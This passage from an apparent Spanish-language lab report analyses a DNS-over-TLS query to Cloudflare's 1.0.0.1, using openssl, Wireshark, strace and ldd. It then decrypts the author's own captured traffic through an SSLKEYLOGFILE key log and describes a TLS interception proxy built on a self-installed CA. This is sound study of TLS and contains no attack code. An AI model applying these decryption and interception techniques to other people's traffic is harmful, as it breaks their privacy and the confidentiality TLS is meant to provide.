b3RDQS5jcmwwHQYDVR0OBBYEFA10Zgpen+Is7NXCXSUEf3Uyuv99MA4GA1UdDwEB
/wQEAwIBhjAKBggqhkjOPQQDAwNpADBmAjEAxYt6Ylk/N8Fch/3fgKYKwI5A011Q
MKW0h3F9JW/NX/F7oYtWrxljheH8n2BrkDybAjEAlCxkLE0vQTYcFzrR24oogyw6
VkgTm92+jiqJTO5SSA9QUa092S5cTKiHkH2cOM6m
-----END CERTIFICATE-----
 2 s:C=US, ST=Texas, L=Houston, O=SSL Corporation, CN=SSL.com Root Certification Authority ECC
   i:C=US, ST=Texas, L=Houston, O=SSL Corporation, CN=SSL.com Root Certification Authority ECC
   a:PKEY: EC, (secp384r1); sigalg: ecdsa-with-SHA256
   v:NotBefore: Feb 12 18:14:03 2016 GMT; NotAfter: Feb 12 18:14:03 2041 GMT
-----BEGIN CERTIFICATE-----
MIICjTCCAhSgAwIBAgIIdebfy8FoW6gwCgYIKoZIzj0EAwIwfDELMAkGA1UEBhMC
VVMxDjAMBgNVBAgMBVRleGFzMRAwDgYDVQQHDAdIb3VzdG9uMRgwFgYDVQQKDA9T
U0wgQ29ycG9yYXRpb24xMTAvBgNVBAMMKFNTTC5jb20gUm9vdCBDZXJ0aWZpY2F0
aW9uIEF1dGhvcml0eSBFQ0MwHhcNMTYwMjEyMTgxNDAzWhcNNDEwMjEyMTgxNDAz
WjB8MQswCQYDVQQGEwJVUzEOMAwGA1UECAwFVGV4YXMxEDAOBgNVBAcMB0hvdXN0
b24xGDAWBgNVBAoMD1NTTCBDb3Jwb3JhdGlvbjExMC8GA1UEAwwoU1NMLmNvbSBS
b290IENlcnRpZmljYXRpb24gQXV0aG9yaXR5IEVDQzB2MBAGByqGSM49AgEGBSuB
BAAiA2IABEVuqVDEpiM2nl8ojRfLliJkP9x6jh3MCLOicSS6jkm5BBtHllirLZXI
7Z4INcgn64mMU1jrYor+8FsPazFSY0E7ic3s7LaNGdM0B9y7xgZ/wkWV7Mt/qCPg
CemB+vNH06NjMGEwHQYDVR0OBBYEFILRhXMw5zUE044CkvvlpNHEIejNMA8GA1Ud
EwEB/wQFMAMBAf8wHwYDVR0jBBgwFoAUgtGFczDnNQTTjgKS++Wk0cQh6M0wDgYD
VR0PAQH/BAQDAgGGMAoGCCqGSM49BAMCA2cAMGQCMG/n61kRpGDPYbCWe+0F+S8T
kdzt5fxQaxFGRrMcIQBiu77D5+jNB5n5DQtdcj7EqgIwH7y6C+IwJPt8bYBVCpk+
gA0z5Wajs6O7pdWLjwkspl1+4vAHCGht0nxpbl/f5Wpl
-----END CERTIFICATE-----
---
Server certificate
subject=C=US, ST=California, L=San Francisco, O=Cloudflare, Inc., CN=cloudflare-dns.com
issuer=C=US, ST=Texas, L=Houston, O=SSL Corp, CN=SSL.com SSL Intermediate CA ECC R2
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: ecdsa_secp256r1_sha256
Negotiated TLS1.3 group: X25519MLKEM768
---
SSL handshake has read 4371 bytes and written 1764 bytes
Verification: OK
Verified peername: one.one.one.one
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 256 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 0 (ok)
---
DONE
</div></code></pre>
<p>donde vemos:</p>
<ul>
<li>
<p><strong>Conexión TCP y arranque de la verificación:</strong></p>
<ul>
<li><code>Connecting to 1.0.0.1</code>: <code>openssl s_client</code> está intentando abrir una conexión al servidor DoT en la IP 1.0.0.1.</li>
<li><code>CONNECTED(00000003)</code>: La conexión TCP se ha establecido correctamente. El dato 00000003 suele ser el descriptor de fichero (fd=3) interno que usa OpenSSL para ese socket.</li>
</ul>
</li>
<li>
<p><strong>Verificación de la cadena</strong>, salida por “depth”: OpenSSL valida la cadena desde la raíz hacia el certificado del servidor.</p>
<ul>
<li><code>depth=N</code> indica el “nivel” dentro de la cadena:
<ul>
<li>depth=2 → CA raíz</li>
<li>depth=1 → CA intermedia</li>
<li>depth=0 → certificado del servidor (leaf)</li>
</ul>
</li>
<li><code>depth=2 ... CN=SSL.com Root Certification Authority ECC</code>: <mark>Este es el certificado raíz. <code>verify return:1</code>: Para ese certificado ha pasado la verificación.</mark></li>
<li><code>depth=1 ... CN=SSL.com SSL Intermediate CA ECC R2</code>: <mark>Esta es la CA intermedia firmada por la raíz. <code>verify return:1</code>: Pasa la verificación de ese nivel.</mark></li>
<li><code>depth=0 ... CN=cloudflare-dns.com</code>: <mark>Este es el certificado del servidor (Cloudflare DoT). <code>verify return:1</code>: Pasa la verificación de ese nivel.</mark></li>
<li>Conclusión: <mark>OpenSSL pudo construir una cadena válida y cada certificado cumple las comprobaciones criptográficas y de confianza.</mark></li>
</ul>
</li>
<li>
<p><strong>Sección <code>Certificate chain</code>:</strong></p>
<ul>
<li><code>0 s: ... CN=cloudflare-dns.com</code>
<ul>
<li><code>0</code> es el leaf, es decir, <mark>el certificado presentado por el servidor.</mark></li>
<li><code>s</code> significa subject del certificado (quién es).</li>
</ul>
</li>
<li><code>i: ... CN=SSL.com SSL Intermediate CA ECC R2</code>:
<ul>
<li><code>i</code>: significa issuer, es decir, quién lo firma.</li>
<li><mark>El leaf está firmado por la intermedia.</mark></li>
</ul>
</li>
<li><code>a:PKEY: EC (prime256v1); sigalg: ecdsa-with-SHA384</code>:
<ul>
<li><mark>La clave pública del servidor es ECC sobre curva prime256v1 (P-256).</mark></li>
<li><mark>La firma del certificado usa ECDSA con SHA-384.</mark></li>
</ul>
</li>
<li><code>v:NotBefore ... NotAfter ...</code>: <mark>Periodo de validez del certificado leaf (vigencia)</mark>.</li>
<li>Bloques PEM: <code>-----BEGIN CERTIFICATE----- ...</code> <mark>Son los certificados en formato base64 (leaf, intermedia, raíz).</mark></li>
</ul>
</li>
<li>
<p><strong><code>Server certificate</code> Resumen del leaf</strong></p>
<ul>
<li><code>subject=... CN=cloudflare-dns.com</code>: Resume el Subject del leaf.</li>
<li><code>issuer=... CN=SSL.com SSL Intermediate CA ECC R2</code>: Resume el Issuer (la CA intermedia que lo firmó).</li>
</ul>
</li>
<li>
<p><strong>Autenticación del servidor y parámetros de TLS:</strong></p>
<ul>
<li><code>No client certificate CA names sent</code>: El servidor no está pidiendo certificado de cliente (no es mTLS).</li>
<li><code>Peer signing digest: SHA256</code>: <mark>Durante el handshake, el servidor firma mensajes (CertificateVerify) y el resumen usado en la firma es SHA-256.</mark></li>
<li><code>Peer signature type: ecdsa_secp256r1_sha256</code>: <mark>La firma que usa el servidor para autenticarse es ECDSA con P-256 y SHA-256.</mark></li>
<li><code>Negotiated TLS1.3 group: X25519MLKEM768</code>: <mark>Grupo de intercambio de claves negociado. En este caso aparece un híbrido/post-quantum o híbrido: Hay (EC)DHE, lo que da PFS.</mark></li>
</ul>
</li>
<li>
<p>Bytes leídos/escritos del handshake: <code>SSL handshake has read ... written ...</code>. Cantidad de bytes intercambiados durante el handshake.</p>
</li>
<li>
<p>Resultado de la validación y del hostname</p>
<ul>
<li><code>Verification: OK</code>: <mark>La cadena y validaciones criptográficas han sido correctas.</mark></li>
<li><code>Verified peername: one.one.one.one</code>: Como ejecutamos el comando con <code>-verify_hostname one.one.one.one</code>, <mark>OpenSSL comprobó que el certificado cubre ese nombre, normalmente vía SAN, y pasó.</mark></li>
</ul>
</li>
<li>
<p>Resumen final de TLS:</p>
<ul>
<li><code>New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384</code>: <mark>Conexión en TLS 1.3 con cipher suite AES-256-GCM + SHA384. En TLS 1.3 el “SHA384” está asociado a HKDF/PRF del suite.</mark></li>
<li><code>No ALPN negotiated</code>: Aunque el cliente pueda anunciar ALPN, el servidor no seleccionó ninguno, o no se negoció.</li>
<li><code>Verify return code: 0 (ok)</code>: Código final de verificación: 0 = OK. <mark>Significa una cadena confiable y verificación correcta.</mark></li>
<li><code>DONE</code>: Fin.</li>
</ul>
</li>
</ul>
<p>Con esta información, ya podemos responder a los siguientes apartados.</p>
<h5 id="subject--san-hostnames"><strong>Subject / SAN (hostnames)</strong></h5>
<ul>
<li>Subject (certificado servidor / leaf): <code>C=US, ST=California, L=San Francisco, O=Cloudflare, Inc., CN=cloudflare-dns.com</code>.</li>
<li>SAN (hostnames relevantes):  <code>extensión Subject Alternative Name</code>:
<ul>
<li>cloudflare-dns.com</li>
<li>*.cloudflare-dns.com</li>
<li><mark><code>one.one.one.one</code>.</mark></li>
</ul>
</li>
</ul>
<h5 id="cadena-de-confianza-intermediara%C3%ADz"><strong>Cadena de confianza (intermedia/raíz)</strong></h5>
<p>Según el bloque <code>Certificate chain</code> y los <code>depth=:</code></p>
<ul>
<li><mark>Leaf (servidor): <code>Cloudflare, Inc. – CN=cloudflare-dns.com</code></mark>
<ul>
<li><mark>Issuer: <code>SSL.com SSL Intermediate CA ECC R2</code>.</mark></li>
</ul>
</li>
<li><mark>Intermedia: <code>SSL.com SSL Intermediate CA ECC R2</code></mark>
<ul>
<li><mark>Issuer: <code>SSL.com Root Certification Authority ECC</code>.</mark></li>
</ul>
</li>
<li><mark>Raíz: <code>SSL.com Root Certification Authority ECC</code></mark>
<ul>
<li><mark>Issuer: ella misma: <code>self-signed root</code>.</mark></li>
</ul>
</li>
</ul>
<h5 id="validaci%C3%B3n-ok--trusted"><strong>Validación (OK / trusted)</strong></h5>
<p><mark>Sí, valida correctamente:</mark></p>
<ul>
<li><mark>En cada nivel: verify return:1</mark></li>
<li>Resumen: <code>Verification: OK</code></li>
<li>Resultado final: <code>Verify return code: 0 (ok)</code></li>
<li>Además, el hostname se verifica contra el certificado: <code>Verified peername: one.one.one.one</code>. Esto prueba que <mark>el SAN/CN cubre ese hostname <code>one.one.one.one</code> y que la verificación de nombre pasó.</mark></li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h3 id="datos"><strong>Datos</strong></h3>
<h4 id="tr%C3%A1fico-de-aplicaci%C3%B3n-cifrado---tls-application-data"><strong>Tráfico de aplicación cifrado - TLS Application Data</strong></h4>
<p><img src="capturas/tarea3-modulo5-datos.png" alt="tarea3-modulo5-datos">
donde vemos:</p>
<ul>
<li>El contenido está cifrado, por lo que Wireshark muestra Application Data y no se puede diseccionar DNS sin claves.</li>
<li>La consulta/respuesta DNS de DoT viaja encapsulada dentro de estos registros TLS.</li>
</ul>
<p><mark>Tras completar el handshake TLS, el intercambio de la consulta/respuesta DoT aparece como registros TLSv1.3 Application Data. Wireshark no puede mostrar el DNS en claro porque el contenido viaja cifrado dentro de TLS</mark>. Únicamente podemos ver, en el sentido cliente→servidor: el envío de datos, en el sentido servidor→cliente: la respuesta y las longitudes de los registros.</p>
<h4 id="cierre-de-conexi%C3%B3n-finack"><strong>Cierre de conexión (FIN/ACK)</strong></h4>
<p><img src="capturas/tarea3-modulo5-final.png" alt="tarea3-modulo5-final.png">
donde:</p>
<ul>
<li>La sesión TCP se cierra con el patrón estándar:
<ul>
<li>Cliente → Servidor: FIN, ACK</li>
<li>Servidor → Cliente: ACK</li>
<li>Servidor → Cliente: FIN, ACK</li>
<li>Cliente → Servidor: ACK</li>
</ul>
</li>
</ul>
<p><mark>La conexión se termina de forma ordenada a nivel TCP mediante el patrón FIN/ACK (cliente inicia FIN, servidor ACK, servidor FIN, cliente ACK). No se aprecian alertas TLS en claro. En TLS 1.3</mark>, un posible <code>close_notify</code> viajaría cifrado como  <code>Application Data</code> si no se dispone de las claves de sesión.</p>
<br>
<h2 id="consultas-con-las-herramientas-strace-y-ldd"><strong>Consultas con las herramientas strace y ldd</strong></h2>
<p>El ejercicio también nos pide responder a:</p>
<ul>
<li>Qué tipo de socket emplea: AF_INET/AF_INET6, SOCK_STREAM, etc</li>
<li>Las llamadas de red (syscalls) que hace: socket, connect, send/recv, close…</li>
<li>Las librerias SSL/TLS empleadas para cifrar las comunicaciones.</li>
</ul>
<p>Para responder al análisis del cliente DoT, distinguimos entre evidencia de red y evidencia de ejecución. El PCAP capturado anteriormente permite observar el protocolo y metadatos de la comunicación: para evidenciar que se trata de TCP, el puerto 853, y detalles del handshake TLS (versión negociada, cipher suite, extensiones como SNI/ALPN). <mark>Sin embargo, el PCAP no contiene llamadas al sistema. Para identificar con precisión el tipo de socket usado por la aplicación (AF_INET/AF_INET6, SOCK_STREAM) y las llamadas de red más relevantes (socket(), connect(), send()/recv() o read()/write(), close()), es necesario ejecutar el cliente bajo <code>strace</code> y guardar el log de syscalls</mark>. Finalmente, para justificar las librerías SSL/TLS empleadas, se aportará los resultados de uar la herramienta <code>ldd</code>.</p>
<h3 id="ejecuci%C3%B3n-del-cliente-kdig-bajo-strace"><strong>Ejecución del cliente kdig bajo strace</strong></h3>
<pre class="hljs"><code><div>strace -f -tt -s 256 \
  -e trace=network,read,write,close \
  -o strace_kdig_net.txt \
  kdig -d @1.0.0.1 +tls-ca +tls-host=one.one.one.one example.com
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>-f</code>: sigue procesos/hilos hijos (muy importante).</li>
<li><code>-tt</code>: timestamps. Es útil para correlacionar con el PCAP.</li>
<li><code>-s 256</code>: no corta strings demasiado pronto.</li>
<li><code>-e trace=network,read,write,close</code>: filtra a lo relevante: syscalls de red + I/O + cierre.</li>
<li><code>-o strace_kdig_net.txt</code>: guarda todo a este fichero.</li>
</ul>
<div style="page-break-before: always;"></div>
<h3 id="el-fichero-strace-kdig-nettxt"><strong>El fichero strace kdig net.txt</strong></h3>
<p><a href="/tarea3-ficheros/strace_kdig_net.txt">El fichero strace_kdig_net.txt</a>.</p>
<h3 id="captura-del-tipo-de-socket-que-emplea"><strong>Captura del tipo de socket que emplea</strong></h3>
<p>Para extraer el tipo de socket que emplea usamos el comando <code>grep</code> sobre el fichero generado por el comando strace y que con contine los logs:</p>
<pre class="hljs"><code><div>grep -E 'socket\(|connect\(' strace_kdig_net.txt                                                            
</div></code></pre>
<p>Resultado:</p>
<pre class="hljs"><code><div>4720  10:49:14.254175 socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
4720  10:49:14.254809 connect(3, {sa_family=AF_INET, sin_port=htons(853), sin_addr=inet_addr(&quot;1.0.0.1&quot;)}, 16) = 
      -1 EINPROGRESS (Operación en curso)
</div></code></pre>
<p>donde el socket que emplea es:</p>
<ul>
<li><code>socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</code>:
<ul>
<li>AF_INET ⇒ familia de direcciones: IPv4.</li>
<li>SOCK_STREAM ⇒ Tipo de socket: orientado a conexión (stream) ⇒ TCP.</li>
<li>IPPROTO_IP → protocolo pasado a socket().</li>
<li>Devuelve FD=3: este descriptor es el que se usa luego en las syscalls connect/send/recv/close.</li>
</ul>
</li>
</ul>
<p><strong><mark>Sockets que emplea: Socket IPv4 (AF_INET) de tipo stream (SOCK_STREAM), es decir, un socket TCP.</mark></strong> El tercer argumento aparece como IPPROTO_IP, que en este contexto actúa como protocolo por defecto/0 en la llamada <code>socket()</code>.</p>
<div style="page-break-before: always;"></div>
<h3 id="captura-de-las-syscalls-empleadas"><strong>Captura de las syscalls empleadas</strong></h3>
<p>Para extraer la syscalls empledas usamos el comando <code>grep</code> sobre el fichero con contine los logs:</p>
<pre class="hljs"><code><div>grep -E '^[0-9]+[[:space:]]+[0-9:.]+[[:space:]]+'\
'(socket|connect|sendmsg|recvfrom|sendto|recvmsg|'\
'setsockopt|getsockopt|shutdown|close)\(' \
strace_kdig_net.txt
</div></code></pre>
<p>donde filtramos para ver:</p>
<ul>
<li>creación del socket</li>
<li>configuración</li>
<li>conexión</li>
<li>envío/recepción (handshake TLS + datos cifrados)</li>
<li>cierre</li>
</ul>
<p>Destamos algunas syscalls:</p>
<pre class="hljs"><code><div>4720  10:49:14.230657 close(3)          = 0
....
....
4720  10:49:14.254269 bind(3, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr(&quot;0.0.0.0&quot;)}, 16) = 0
4720  10:49:14.254175 socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
4720  10:49:14.254765 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0
4720  10:49:14.254809 connect(3, {sa_family=AF_INET, sin_port=htons(853), sin_addr=inet_addr(&quot;1.0.0.1&quot;)}, 16) = -1 EINPROGRESS (Operación en curso)
4720  10:49:14.274362 getsockopt(3, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4720  10:49:14.276450 sendmsg(3, {msg_name=NULL, msg_namelen=0, msg_iov=.........
4720  10:49:14.294324 recvfrom(3, &quot;\24\3\3\0\1&quot;, 5, 0, NULL, NULL) = 5
4720  10:49:14.294392 recvfrom(3, &quot;\1&quot;, 1, 0, NULL, NULL) = 1
4720  10:49:14.294456 recvfrom(3, &quot;\27\3\3\fJ&quot;, 5, 0, NULL, NULL) = 5
4720  10:49:14.294519 recvfrom(3, ......
4720  10:49:14.302012 recvfrom(3, 0x5a0464be9893, 5, 0, NULL, NULL) = -1 EAGAIN (Recurso no disponible temporalmente)
4720  10:49:14.321183 recvfrom(3, &quot;\27\3\3\1\275&quot;, 5, 0, NULL, NULL) = 5
4720  10:49:14.321235 recvfrom(3, .......
4720  10:49:14.321598 sendmsg(3, {msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base=&quot;.......
4720  10:49:14.321632 recvfrom(3, 0x5a0464be9893, 5, 0, NULL, NULL) = -1 EAGAIN (Recurso no disponible temporalmente)
4720  10:49:14.321645 close(3)          = 0
</div></code></pre>
<div style="page-break-before: always;"></div>
<p>donde vemos las <mark>Syscalls usadas</mark>:</p>
<ul>
<li><code>bind()</code>: Asocia un socket con una dirección y un puerto específicos en nuestra máquina virtual.</li>
<li><code>socket()</code>: Creación del socket: AF_INET, SOCK_STREAM → inicio de la comunicación.</li>
<li><code>setsockopt()</code>: Configuración del socket.</li>
<li><code>connect()</code>: Intento de conexión al servidor 1.0.0.1:853.</li>
<li><code>getsockopt()</code>: Comprobación del estado del connect().</li>
<li><code>sendmsg()</code>: Envío de datos por el socket: handshake TLS y después datos cifrados.</li>
<li><code>recvfrom()</code>: Recepción de datos por el socket: respuestas TLS / application data cifrada.</li>
<li><code>close()</code>: Cierre del descriptor: final de la conexión.</li>
</ul>
<p>Resumiendo: <mark>El rastreo de estas syscalls permite reconstruir el ciclo de vida completo de la consulta DoT a nivel de kernel; desde la reserva de recursos y el establecimiento del flujo TCP mediante socket() y connect(), hasta el intercambio de tramas cifradas.</mark></p>
<br>
<h3 id="captura-de-las-librerias-ssltls-empleadas"><strong>Captura de las Librerias SSL/TLS empleadas</strong></h3>
<p>Para capturar qué librerías criptográficas/TLS está empleado kdig en la máquina virtual para cifrar las comunicaciones, usaremos <code>ldd</code> sobre el binario <code>kdig</code> y luego filtraremos con <code>grep</code>:</p>
<pre class="hljs"><code><div>ldd &quot;$(which kdig)&quot; | grep -Ei 'gnutls|ssl|crypto|mbedtls|wolfssl|nss|nettle|gcrypt|sodium'
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>which kdig</code>: Encuentra la ruta completa donde está instalado el kdig.</li>
<li><code>ldd</code>: Lista todas las librerías dinámicas de las que depende ese kdig para ejecutarse.</li>
<li><code>grep -Ei '...'</code>: Filtra la lista para mostrar solo aquellas librerías relacionadas con motores de cifrado y protocolos de seguridad (SSL/TLS).</li>
</ul>
<p>Resultado:</p>
<pre class="hljs"><code><div>libdnssec.so.9 =&gt; /lib/x86_64-linux-gnu/libdnssec.so.9 (0x00007fb9c11f6000)
libgnutls.so.30 =&gt; /lib/x86_64-linux-gnu/libgnutls.so.30 (0x00007fb9c0ffc000)
libnettle.so.8 =&gt; /lib/x86_64-linux-gnu/libnettle.so.8 (0x00007fb9c0891000)
</div></code></pre>
<p>donde:</p>
<ul>
<li>
<p><code>libgnutls.so.30</code>:</p>
<ul>
<li>libgnutls es la librería TLS que implementa TLS 1.2/1.3, certificados X.509, handshake, cifrados, etc..</li>
<li><mark>kdig usa GnuTLS para establecer el canal TLS de DoT.</mark></li>
</ul>
</li>
<li>
<p><code>libnettle.so.8</code>:</p>
<ul>
<li>Nettle es una librería de primitivas criptográficas: hashes, HMAC, AES, ECC, etc. que GnuTLS utiliza como backend criptográfico.</li>
<li><mark>GnuTLS se apoya en Nettle para operaciones criptográficas.</mark></li>
</ul>
</li>
<li>
<p><code>libdnssec.so.9</code>:</p>
<ul>
<li>Esto no es TLS, es la librería de DNSSEC para validación de firmas DNS, claves, etc.</li>
<li>Es relevante para DNS y para kdig, pero NO es la librería que cifra el canal TLS.</li>
</ul>
</li>
</ul>
<br>
<h4 id="rol-de-la-librer%C3%ADa-gnutls-dentro-de-kdig"><strong>Rol de la librería GnuTLS dentro de kdig</strong></h4>
<p>Rol que juega la librería GnuTLS dentro de kdig como responsable del handshake, cifrado, verificación de certificados:</p>
<ul>
<li>
<p>Handshake TLS - Establecimiento de sesión: <mark>GnuTLS ejecuta todo el handshake TLS 1.3 sobre el socket TCP que abre kdig:</mark></p>
<ul>
<li>Envía ClientHello (con extensiones como SNI, supported_versions, key_share).</li>
<li>Procesa ServerHello y el resto de mensajes del servidor.</li>
<li>Negocia parámetros: versión TLS, grupo ECDHE (p. ej. x25519) y cipher suite (p. ej. AES-GCM).</li>
</ul>
<p>Resultado: <mark>Se deriva un conjunto de claves de sesión (simétricas) para cifrar el tráfico posterior.</mark></p>
</li>
<li>
<p>Intercambio de claves efímero y PFS: En TLS 1.3, el intercambio de claves es (EC)DHE efímero (lo vimos en el apartado <code>key_share: x25519</code>). <mark>GnuTLS gestiona:</mark></p>
<ul>
<li><mark>La generación de claves efímeras del cliente.</mark></li>
<li><mark>El cálculo del secreto compartido.</mark></li>
<li><mark>La derivación de claves con HKDF.</mark></li>
</ul>
<p>Implicación: <mark>Da <code>Perfect Forward Secrecy</code>: Capturar tráfico + Conocer la clave privada del servidor NO basta para descifrar después.</mark></p>
</li>
<li>
<p>Verificación de certificados - Autenticación del servidor: <mark>GnuTLS valida la identidad del servidor</mark>, que es crítico en DoT:</p>
<ul>
<li><mark>Construye la cadena de certificados (leaf → intermedia → raíz).</mark></li>
<li><mark>Verifica firma, validez temporal, CA de confianza del sistema.</mark></li>
<li><mark>Verifica el nombre: +tls-host=one.one.one.one fuerza la comprobación del hostname (y también se usa como SNI).</mark></li>
</ul>
<p>Resultado: <mark>Evita MITM si el certificado no corresponde o no es confiable.</mark></p>
</li>
<li>
<p>Cifrado y autenticación del tráfico - Application Data: Una vez finalizado el handshake:</p>
<ul>
<li><mark>GnuTLS cifra/des cifra los datos con la suite negociada (AES-256-GCM).</mark></li>
<li><mark>Aporta integridad/autenticación (AEAD), detectando manipulación.</mark></li>
</ul>
</li>
<li>
<p>Interfaz con kdig - lectura/escritura: <mark>kdig no cifra a mano, pasa los datos DNS a la API TLS (GnuTLS)</mark>, y esta:</p>
<ul>
<li>Empaqueta en registros TLS,</li>
<li>gestiona reintentos, fragmentación TLS, alertas, cierre TLS,</li>
<li>escribe/lee del socket TCP subyacente.</li>
</ul>
</li>
</ul>
<p><strong>Resumiendo:</strong> <mark>En kdig, GnuTLS implementa el protocolo TLS para DoT: realiza el handshake (negociación de versión/cifrados y key exchange efímero), valida la cadena de certificados y el hostname (autenticación del servidor) y cifra/autentica el tráfico de aplicación (DNS) con la suite negociada (AES-GCM). GnuTLS delega primitivas criptográficas (hashes, AES, etc.) en Nettle.</mark></p>
<br>
<br>
<h1 id="5-fase-2"><strong>5. Fase 2</strong></h1>
<p>Hemos visto que para descifrar tráfico DNS-over-TLS (DoT), Cloudflare negocia TLS 1.3 con (EC)DHE/PFS). Es por ello que las dos técnicas del Capítulo 7 que voy a usar son:</p>
<ul>
<li>
<p><strong>Key logging  - Archivo de secretos de TLS → Wireshark:</strong> La idea es conseguir las claves de sesión desde el cliente, o desde la librería TLS que use, y dárselas a Wireshark para que descifre el flujo.</p>
<ul>
<li>Se genera un key log file, con formato tipo SSLKEYLOGFILE / “(Pre)-Master-Secret log”.</li>
<li>Luego en Wireshark cargamos este fichero generado: Preferences → Protocols → TLS → (Pre)-Master-Secret log filename.</li>
<li>Ventaja: funciona aunque haya PFS (TLS 1.3 + ECDHE), porque estamos obteniendo los secretos en el endpoint.</li>
</ul>
</li>
<li>
<p><strong>Intercepción activa con proxy TLS / MITM (CA propia):</strong> La idea es montar un Adversary-in-the-Middle controlado: un proxy que “termina TLS” con el cliente y abre “otro TLS” con Cloudflare.</p>
<ul>
<li>Instalamos una CA propia y hacemoss que el cliente confíe en ella.</li>
<li>Redirigimos el tráfico DoT (TCP/853) al proxy.</li>
<li>El proxy nos da el tráfico ya descifrado, o lo podemos exportar/registrar, y luego lo capturamos y analizamos.</li>
</ul>
</li>
</ul>
<p><strong>NO se puede elegir la técnica RSA private key del servidor para Cloudflare DoT</strong> porque esta técnica sólo funciona cuando el intercambio de claves es RSA key exchange sin PFS (típico de TLS antiguo con ciertas suites). En este caso hamos visto que usa TLS 1.3 + ECDHE (PFS), así que aunque tuvieramos la clave privada del servidor, no podríamos descrifrar nada a posteriori.</p>
<div style="page-break-before: always;"></div>
<h2 id="key-logging-archivo-de-secretos-de-tls-wireshark"><strong>Key logging, Archivo de secretos de TLS, Wireshark</strong></h2>
<p>Vamos a intentar descifrar el tráfico utilizando un archivo de secretos (Key Logging). Este método permite descifrar protocolos modernos, como TLS 1.2 y 1.3, que utilizan Perfect Forward Secrecy (PFS).</p>
<p>Pasos que vamos a seguir para descifrar el tráfico DoT, TLS sobre TCP en el puerto 853, en Wireshark usando <code>key logging</code>:</p>
<ul>
<li>Hacer que la librería TLS, que vimos en un apartado anterior que era GnuTLS, escriba las claves de sesión en un fichero. En una máquina virtual linux, esto se hace con la variable de entorno <code>SSLKEYLOGFILE</code>. GnuTLS la soporta y escribe las claves en formato <code>NSS Key Log</code>, que es compatible con Wireshark. El formato <code>NSS</code> es formato de texto plano que contiene valores como el <code>CLIENT_RANDOM</code> que Wireshark utiliza para reconstruir la clave de cifrado simétrico y mostrarnos el contenido de los paquetes <code>DNS-over-TLS</code>.</li>
<li>Cargamos en Wireshark ese fichero para ver en crudo las comunicaciones que ya no estarán cifradas.</li>
</ul>
<p><strong>Creamos el fichero de claves y exportamos la variable de entorno <code>SSLKEYLOGFILE</code>:</strong></p>
<ul>
<li>La variable debe estar definida ANTES de lanzar kdig, porque quien escribe el fichero es la librería TLS GnuTLS al crear la sesión.</li>
<li>Antes de ejecutar <code>kdig</code>, ejecutamos en una terminal:<pre class="hljs"><code><div>export SSLKEYLOGFILE=&quot;$HOME/tlskeys_kdig.log&quot;
: &gt; &quot;$SSLKEYLOGFILE&quot;
chmod 600 &quot;$SSLKEYLOGFILE&quot;
</div></code></pre>
donde:
<ul>
<li><code>: &gt; &quot;$SSLKEYLOGFILE&quot;</code>: crea un fichero vacía.</li>
<li><code>chmod 600 &quot;$SSLKEYLOGFILE&quot;</code>: sólo nosotros podemos leerlo.</li>
</ul>
</li>
</ul>
<p><strong>Capturar el tráfico:</strong> Ejecutamos el siguiente comando para capturar el tráfico de red que nos interesa, en un fichero pcap:</p>
<pre class="hljs"><code><div>sudo tcpdump -ni enp0s3 host 1.0.0.1 and tcp port 853 -w trafico_cloudflare_1.0.0.1_2.pcap
</div></code></pre>
<p><strong>Generar tráfico DoT con kdig:</strong> En la misma terminal donde se generó la variable de entorno lanzamos un par de veces la herramient kdig:</p>
<pre class="hljs"><code><div>kdig -d @1.0.0.1 +tls-ca +tls-host=one.one.one.one example.com
kdig -d @1.0.0.1 +tls-ca +tls-host=one.one.one.one cloudflare.com
</div></code></pre>
<p><strong>Resultado de la captura del tráfico:</strong><br>
<img src="capturas/tarea3-modulo5-sslkeylogfile-1.png" alt="tarea3-modulo5-sslkeylogfile-1.png"></p>
<p><strong>Resultado del fichero <code>tlskeys_kdig.log</code>:</strong><br>
<a href="/tarea3-ficheros/tlskeys_kdig.log">tlskeys_kdig.log</a></p>
<p><img src="capturas/tarea3-modulo5-sslkeylogfile-2.png" alt="tarea3-modulo5-sslkeylogfile-2.png"></p>
<p><strong>Abrimos el fichero pcap con Wireshark:</strong> Cargamos el key log en Wireshark:</p>
<ul>
<li>Vamos a Edit → Preferences → Protocols → TLS.</li>
<li>En la opción <code>(Pre)-Master-Secret log filename</code>, seleccionamos el fichero fichero <code>tlskeys_kdig.log</code>.</li>
<li>Aceptamos.</li>
<li>Wireshark usará ese fichero para descifrar TLS, incluido TLS 1.3 y suites con (EC)DHE:
<img src="capturas/tarea3-modulo5-sslkeylogfile-3.png" alt="tarea3-modulo5-sslkeylogfile-3.png"></li>
</ul>
<p><strong>Comprobamos que ya tenemos el tráfico DEScifrado:</strong> Aplicamos el siguiente filtro: <code>tls &amp;&amp; ip.addr==1.0.0.1 &amp;&amp; tcp.port==853</code>.
<img src="capturas/tarea3-modulo5-sslkeylogfile-4.png" alt="tarea3-modulo5-sslkeylogfile-4.png">
donde:</p>
<ul>
<li>Vemos dos sesiones TLS 1.3 separadas, una para example.com y otra para cloudflare.com, cada una con su handshake, consulta DNS, respuesta y cierre limpio.
<ul>
<li>Paquete 12: <code>DNS 206 Standard query ... A example.com</code>.</li>
<li>Paquete 33: <code>DNS 206 Standard query ... A cloudflare.com OPT</code>.</li>
</ul>
</li>
<li>En el panel inferior Packet Deatils: <code>Certificate</code>:
<ul>
<li><code>Handshake Type: Certificate (11)</code></li>
<li><code>Certificates Length: 2979 bytes</code></li>
<li>Esto es el envío de la cadena de certificados del servidor (Cloudflare).</li>
</ul>
</li>
<li>En el panel inferior Packet Deatils: <code>Certificate Verify</code>:
<ul>
<li><code>Signature Algorithm: ecdsa_secp256r1_sha256 (0x0403)</code>: El servidor firma para demostrar posesión de la clave privada del cert.</li>
</ul>
</li>
